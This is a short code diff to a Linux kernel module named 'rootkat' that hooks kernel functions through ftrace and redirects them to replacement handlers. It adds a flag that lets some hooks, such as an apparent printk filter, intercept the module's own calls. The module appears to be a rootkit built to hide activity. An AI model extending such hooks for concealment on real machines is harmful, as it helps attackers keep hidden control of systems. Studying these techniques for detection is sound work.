@@ -12,8 +12,10 @@ static void notrace rootkat_ftrace_thunk(unsigned long ip, unsigned long parent_
 	struct rootkat_hook *h = container_of(ops, struct rootkat_hook, ops);
 	struct pt_regs *regs = ftrace_get_regs(fregs);
 
-	/* Avoid re-entry from our own replacement. */
-	if (within_module(parent_ip, THIS_MODULE))
+	/* Avoid re-entry from our own replacement. The opt-out flag is for
+	 * hooks that explicitly want to intercept calls originating in
+	 * rootkat.ko itself (e.g. the printk filter). */
+	if (!h->intercept_own_calls && within_module(parent_ip, THIS_MODULE))
 		return;
 
 	regs->ip = (unsigned long)h->replacement;
